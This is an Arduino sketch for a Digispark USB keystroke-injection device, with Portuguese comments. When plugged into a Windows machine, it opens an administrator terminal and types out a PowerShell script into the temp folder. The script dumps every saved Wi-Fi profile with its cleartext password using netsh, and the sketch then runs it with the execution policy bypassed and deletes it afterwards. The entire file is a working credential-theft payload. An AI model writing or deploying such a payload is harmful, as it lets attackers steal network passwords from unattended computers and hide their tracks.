#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2800);

  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2200);

  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);

  DigiKeyboard.print(F("set TEMP_TXT=%TEMP%\\wifi_dump.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  DigiKeyboard.print(F("set TEMP_PS1=%TEMP%\\wifi_dump.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  // Cria script PowerShell no .txt
  DigiKeyboard.print(F("echo $profiles = netsh wlan show profiles ^| Where-Object { $_ -match ':' } ^| ForEach-Object { ($_ -split ':' )[1].Trim() } > %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo foreach ($name in $profiles) { >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo     $details = netsh wlan show profile name=^\"$name^\" key=clear >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo     $passwordLine = $details ^| Where-Object { $_ -match 'da Chave^|Key' } >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo     if ($passwordLine) { >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo         $password = ($passwordLine -replace '.*:\\s*', '').Trim() >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo         Write-Output ^\"$name : $password^\" >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo     } else { Write-Output ^\"$name : (sem senha)^\" } >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("echo } >> %TEMP_TXT%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("rename %TEMP_TXT% wifi_dump.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  // Executa o script PowerShell
  DigiKeyboard.print(F("powershell -ExecutionPolicy Bypass -File %TEMP%\\wifi_dump.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);

  DigiKeyboard.print(F("del %TEMP%\\wifi_dump.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);

  for (;;) {}
}

void loop() {}
